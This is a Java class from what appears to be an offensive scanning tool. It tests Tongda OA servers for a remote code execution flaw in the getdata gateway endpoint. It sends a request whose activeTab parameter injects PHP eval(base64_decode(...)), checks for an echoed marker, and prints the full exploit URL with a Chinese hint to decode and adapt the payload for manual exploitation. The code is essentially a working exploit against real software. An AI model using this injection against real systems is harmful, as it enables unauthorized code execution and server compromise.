package exp.oa.tongdaoa;

import cn.hutool.http.HttpRequest;
import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;

import java.util.HashMap;

public class tongdaoa_getdata implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea) {
        Boolean att = att(url, textArea);
        return att;
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Platform.runLater(()->{
        textArea.appendText("\n 该漏洞已直接执行系统命令 无法getshell");
        });
        return false;
    }

    private Boolean att(String url,TextArea textArea){
        Response response = HttpTools.get(url + "/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22ZWNobyB2dWxuX3Rlc3Q7%22)))%3B/*&id=19&module=Carouselimage", new HashMap<String, String>(), "utf-8");
        if(response.getCode() == 200 && response.getText().contains("vuln_test")){
            Platform.runLater(()-> {
                textArea.appendText("\n 漏洞存在 漏洞利用请 base64解码 中间参数手动利用\n" + url + "/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22ZWNobyB2dWxuX3Rlc3Q7%22)))%3B/*&id=19&module=Carouselimage");
            });
            return true;
        }else {
            Platform.runLater(()->{
                textArea.appendText("\n tongdaoa_getdata-RCE 漏洞不存在 (出现误报请联系作者)");
            });
            return false;
        }
    }

}
